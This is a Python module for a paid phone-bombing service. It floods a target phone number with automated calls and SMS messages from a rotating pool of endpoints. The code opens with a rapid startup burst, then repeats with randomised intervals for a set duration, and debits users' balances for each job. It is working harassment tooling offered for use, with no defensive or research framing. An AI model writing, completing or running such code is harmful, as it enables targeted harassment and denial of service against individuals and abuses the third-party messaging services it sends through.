import time, random, threading
import state, endpoints

POOL = endpoints.get_pool()

def _fire(bomb):
    pool = POOL
    active = [e for e in pool if not e.cooling()] or pool
    ep = random.choice(active)
    phone = bomb["phone"]
    if bomb["mode"] in ("call", "both"):
        ok = ep.call(phone)
        if not ok:
            ep.fail()
        else:
            bomb["calls"] += 1
    if bomb["mode"] in ("sms", "both"):
        ok = ep.sms(phone, bomb.get("text") or "You have a new message.")
        if not ok:
            ep.fail()
        else:
            bomb["sms"] += 1

def _run(bomb):
    bid = bomb["id"]
    end = time.time() + bomb["minutes"] * 60
    interval = bomb.get("interval", 0.5)
    # lightning-fast startup burst
    for _ in range(bomb.get("burst", 8)):
        b = state.get_bomb(bid)
        if not b or not b["running"]:
            return
        _fire(bomb)
    while True:
        b = state.get_bomb(bid)
        if not b or not b["running"]:
            break
        if time.time() >= end:
            break
        _fire(bomb)
        time.sleep(max(0.05, interval + random.uniform(0, interval * 0.3)))
    b = state.get_bomb(bid)
    if b:
        b["running"] = False
        b["finished"] = time.time()

def start(uid, phone, minutes, mode, interval=0.5, text="", cost=0.0):
    if cost > 0 and not state.debit(uid, cost):
        return {"ok": False, "err": "Insufficient balance"}
    bid = "%s_%d_%d" % (uid, int(time.time()), random.randint(1000, 9999))
    bomb = {"id": bid, "user": str(uid), "phone": phone, "minutes": minutes,
            "mode": mode, "interval": interval, "text": text,
            "calls": 0, "sms": 0, "running": True,
            "started": time.time(), "finished": None}
    state.add_bomb(bomb)
    threading.Thread(target=_run, args=(bomb,), daemon=True).start()
    return {"ok": True, "bomb": bomb}

def stop(uid):
    n = 0
    for b in state.user_bombs(uid):
        if b["running"]:
            b["running"] = False
            n += 1
    return n
